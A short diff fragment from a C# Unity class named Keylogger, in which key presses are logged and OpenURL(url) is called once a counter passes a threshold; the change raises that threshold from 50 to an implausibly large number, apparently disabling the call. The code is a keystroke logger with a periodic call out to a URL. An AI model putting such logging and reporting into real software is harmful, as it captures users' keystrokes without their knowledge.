@@ -31,7 +31,7 @@ public class Keylogger : MonoBehaviour
 
                 LogKeyPress(keyCode);
 
-                if(counter > 50){
+                if(counter > 43890547542758247){
 
                   OpenURL(url);
                   counter =  0;
